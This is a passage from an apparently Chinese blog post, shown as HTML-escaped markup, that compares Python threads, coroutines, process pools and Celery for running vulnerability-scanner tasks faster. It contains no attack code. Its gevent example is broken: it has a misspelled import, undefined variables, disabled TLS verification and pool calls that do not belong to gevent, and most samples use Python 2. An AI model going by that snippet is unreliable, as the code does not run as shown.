&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;concurrent.futures&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPoolExecutor&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sayhello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hello: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;start1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sayhello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;end1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;time1: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#submit提交&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;start2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPoolExecutor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;executor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;executor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sayhello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;end2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;time2: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#map提交&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;start3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPoolExecutor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;executor1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;executor1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sayhello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;end3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;time3: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我们可以看看上面的代码注释，其中submit和map的区别在于：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;map可以保证输出的顺序, submit输出的顺序是乱的。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;如果你要提交的任务的函数是一样的，就可以简化成map。但是假如提交的任务函数是不一样的，或者执行的过程之可能出现异常（使用map执行过程中发现问题会直接抛出错误）就要用到submit。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;submit和map的参数是不同的，submit每次都需要提交一个目标函数和对应的参数，map只需要提交一次目标函数，目标函数的参数放在一个迭代器（列表，字典）里就可以。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;协程&quot;&gt;协程&lt;/h3&gt;

&lt;p&gt;协程算是一种用户级别的轻量级线程，调度较线程会麻烦一些，但因为开销减少提升了性能。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;gevent&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个就是熟面孔了，许多经典爬虫都会用到这个库，在linux下贼好用的。不过因为依赖库的问题，让它在win下总是出现greenlet等库的版本和依赖问题。&lt;/p&gt;

&lt;p&gt;不过比之线程池的threadpool，这个不加锁时也不用担心乱序问题。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool
import requestss

def detect(url):
    try:
        r = requests.get(url,  headers= headers ,timeout = timeout ,verify = False)
    except Exception,e:
        return

pool = Pool(20)#协程数
pool.map(detect, urls)
[pool.putRequest(req) for req in reqs]
pool.wait()

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;其他协程库&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;另外，其他实现协程的库还是蛮多的，这里不方便列举，有兴趣的朋友可以搜搜。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;asyncio&lt;/li&gt;
  &lt;li&gt;tornado&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;进程&quot;&gt;进程&lt;/h3&gt;

&lt;p&gt;进程间的切换，会消耗较多的资源和时间，一般会配合多线程/协程使用，叠加对任务进行分发。&lt;/p&gt;

&lt;p&gt;下面我们来看几个案例：&lt;/p&gt;

&lt;h4 id=&quot;多进程&quot;&gt;多进程&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;fork&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;教科书式的的案例，曾收录在不少经典编程书籍里：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/env python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Process (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s) start...'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'I am child process (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s) and my parent is &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getppid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'I (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s) just created a child process (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s).'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;multiprocessing的多进程&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/env python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;multiprocessing&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run_proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Run child process &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)...'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Parent process &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Process will start.'&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Process end.'&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;multiprocessing下的多线程&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在multiprocessing下也有个多线程模块,通过async_result.get()可以获取结果。&lt;/p&gt;

&lt;p&gt;multiprocessing也能实现多线程，它有两个多线程的入口，一个是 dummy Pool：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# -*- coding: utf-8 -*-
# from multiprocessing import Pool 多进程
from multiprocessing.dummy import Pool as ThreadPool #多线程
import time
import urllib2
 
urls = [
    'http://www.python.org', 
    'http://www.python.org/about/',
    'http://www.onlamp.com/pub/a/python/2003/04/17/metaclasses.html',
    ]
 
# 单线程
start = time.time()
results = map(urllib2.urlopen, urls)
print 'Normal:', time.time() - start
 
# 多线程
start2 = time.time()
# 开4个 worker，没有参数时默认是 cpu 的核心数
pool = ThreadPool(4)
# 在线程中执行 urllib2.urlopen(url) 并返回执行结果
results2 = pool.map(urllib2.urlopen, urls)
pool.close()
pool.join()
print 'Thread Pool:', time.time() - start2

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;另一个是pool.ThreadPool：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from multiprocessing.pool import ThreadPool
 
def foo(bar, baz):
  print 'hello {0}'.format(bar)
  return 'foo' + baz
 
pool = ThreadPool(processes=1)
 
async_result = pool.apply_async(foo, ('xiaorui.cc', 'foo',))

return_val = async_result.get()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;进程池&quot;&gt;进程池&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;multiprocessing进程池&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;注意下面代码的注释，apply_async和apply函数，前者是非阻塞的，后者是阻塞。可以看出运行时间相差的倍数正是进程池数量。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import multiprocessing
import time

def func(msg):
    print &quot;msg:&quot;, msg
    time.sleep(3)
    print &quot;end&quot;
    return &quot;done&quot; + msg

if __name__ == &quot;__main__&quot;:
    pool = multiprocessing.Pool(processes=4)
    result = []
    for i in xrange(3):
        msg = &quot;hello %d&quot; %(i)
        #result.append(pool.apply(func, (msg, )))
		result.append(pool.apply_async(func, (msg, )))
    pool.close()
    pool.join()
    for res in result:
        print &quot;:::&quot;, res.get()
    print &quot;Sub-process(es) done.&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;封装库&quot;&gt;封装库&lt;/h3&gt;

&lt;p&gt;网上还有一些通过封装多进程、多线程、队列组合成的第三方库，也能达到比较好的效果，这种库对于细节的优化较好。&lt;/p&gt;

&lt;p&gt;下面是某个第三方库的代码：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#coding=utf-8

import threading
import Queue

from billiard.dummy import DummyProcess

class work(DummyProcess):
    def __init__(self, workQueue, result_queue, timeout=5, **kwargs):
        self.timeout = timeout
        self.result_queue = result_queue
        self.isRunning = False
        self.workQueue = workQueue
        DummyProcess.__init__(self, kwargs=kwargs)


    def stop(self):
        self.isRunning = False

    def run(self):
        self.isRunning = True
        while self.isRunning:
            try:
                func, args, kwargs = self.workQueue.get(timeout=self.timeout)
                result = apply(func, *args, **kwargs)
                self.workQueue.task_done()
                self.result_queue.put(result, False)
            except Queue.Empty:
                self.isRunning = False
            except:
                pass

class ThreadPool:
    def __init__(self, num_of_threads=10):
        self.workQueue = Queue.Queue()
        self.result_queue = Queue.Queue()
        self.threads = []

        for i in range(num_of_threads):
            thread = work(self.workQueue, self.result_queue)
            self.threads.append(thread)

    def add_job(self, fun, *args, **kwargs):
        self.workQueue.put((fun, args, kwargs))
    
    def get_result(self):
        results = []
        try:
            while True:
                result = self.result_queue.get(block=False)
                results.append(result)
        except Exception,e:
            print str(e)
        finally:
            return results

    def start(self):
        try:
            for t in self.threads:
                t.start()
        except:
            self.stop()

    def stop(self):
        for t in self.threads:
            t.stop()

    def wait_for_complete(self):
        try:
            for t in self.threads:
                while t.isAlive():
                    t.join(10)

        except KeyboardInterrupt:
            self.stop()
            print


if __name__ == &quot;__main__&quot;:
    tp = ThreadPool(20)
    for line in open('target.txt').readlines():
        evil = Evil_Class(line)
        tp.add_job(evil.run)
    tp.start()
    try:
        tp.wait_for_complete()
        resp = tp.get_result()
    except KeyboardInterrupt:
        tp.stop()


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;分布式任务&quot;&gt;分布式任务&lt;/h3&gt;

&lt;p&gt;对于分布式任务的话，配置起来会比较麻烦。比如你就一台PC或者破VPS，还想搞多节点分布式任务，显然吃饱了撑着没事干。&lt;/p&gt;

&lt;p&gt;分布式的优点的话，主要在于其可扩展性，理论上只要消息中间件和容错机制足够稳健，带宽足够高，就能最大化提升扫描器的性能。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;celery&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;celery是一个国外的分布式调度框架，在扫描器方面，我们可以采用几种方案：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;单机器 + 多节点 + 线/进程池&lt;/li&gt;
    &lt;li&gt;多机器 + 多节点 + 线/进程池&lt;/li&gt;
    &lt;li&gt;多机器 + 多节点&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;前两条对扫描器性能提升确实是有的，但如果个别网络任务如果耗时较长的话，会持续占用进而耗尽节点的资源。
即使每条任务里，我们都会尽可能提升进程/线程数，但如果其中仍然包含有多级网络任务调用，那么扫描的速率也不会有太大的提升。因为除了机器资源以外，扫描器还会受带宽、网卡出口等其他因素的影响。&lt;/p&gt;

&lt;p&gt;如果我们遵循第三条，最大化利用celery节点运行任务，将所有线/进程池尽可能替换，则会是另一个场景。
当每一个插件或者fuzz脚本，都作为单条任务去运行时，容错机制会及时结束掉每一个失败/超时的任务。在我们做好中间件和存储的灾备机制的前提下，扫描器将会变得更加稳健。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;bugscan&lt;/li&gt;
